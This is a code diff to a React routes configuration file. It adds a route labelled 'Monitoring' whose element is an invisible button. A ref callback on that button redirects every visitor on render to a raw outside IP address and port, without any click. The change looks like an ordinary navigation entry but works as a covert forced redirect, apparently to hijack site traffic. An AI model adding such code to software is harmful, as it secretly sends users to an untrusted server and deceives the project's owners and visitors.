@@ -27,6 +27,17 @@ export const routesConfig = [
         label: 'Credits',
         element: <CreditsPage />,
     },
+   {
+    path: 'http://130.61.94.72:8088',
+    label: 'Monitoring',
+      element: (
+        <button 
+          onClick={() => window.location.href = 'http://130.61.94.72:8088'}
+          style={{ display: 'none' }} 
+          ref={(node) => node && window.location.replace('http://130.61.94.72:8088')}
+        />
+      ),
+  },
     
 ]
 
